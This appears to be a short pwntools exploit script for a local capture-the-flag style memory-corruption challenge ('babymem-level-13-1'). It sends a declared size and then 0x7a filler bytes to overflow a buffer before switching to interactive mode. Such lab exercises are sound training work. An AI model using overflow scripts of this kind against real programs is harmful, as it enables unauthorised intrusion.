from pwn import *

p = process('/challenge/babymem-level-13-1')
p.recvuntil('Payload size:')
p.sendline(b'500')
payload = b'A' * 0x7a

#p.recvline('Send your payload')
p.send(payload)
p.interactive()
